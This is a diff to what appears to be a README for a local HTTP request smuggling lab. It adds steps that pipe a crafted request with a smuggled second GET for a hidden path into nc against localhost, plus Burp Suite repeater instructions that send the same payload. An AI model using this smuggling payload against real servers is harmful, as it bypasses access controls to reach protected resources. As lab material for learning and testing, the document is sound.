@@ -34,20 +34,22 @@ Enjoy!
 
 
 
-###	
+##	Reproduce
+
+### open linux terminal and paste the below command
 
 ```bash
 printf 'GET /a HTTP/1.1\r\n'\
 'Host: localhost\r\n'\
 'Content-Length: 56\r\n'\
 '\r\n'\
-'GET /_hidden/index.html HTTP/1.1\r\n'\
-'Host: notlocalhost\r\n'\
+'GET /sensitive/index.html HTTP/1.1\r\n'\
+'Host: attackerhost\r\n'\
 '\r\n'\
 |nc 127.0.0.1 9015
 ```
 
-Try the command above and you will get two responses as following.
+ ### The above  above and you will get two responses as following.
 
 ```http
 HTTP/1.1 302 Moved Temporarily
@@ -74,7 +76,29 @@ Connection: keep-alive
 
 successfully accessed my secret!
 ```
+## Reproduce using **Burpsuite**
 
+1. Open bursuite and firefox 
+2. open the url **127.0.0.1:9095** in the browser 
+3. intercept the request and send it to the repeater 
+4. Now replace the intercepted rrequest with the following request 
+```bash 
+GET / HTTP/1.1
+Host: 127.0.0.1:9095
+Content-Length: 56
+
+GET /_hidden/index.html HTTP/1.1
+Host: attackerhost
+
+
+```
+[image]
+
+5. when you send the request we will get below response
+[image]
+
+6.Repeat the process untill we will get two response from server as below
+[image]
 
 
 #	Reference
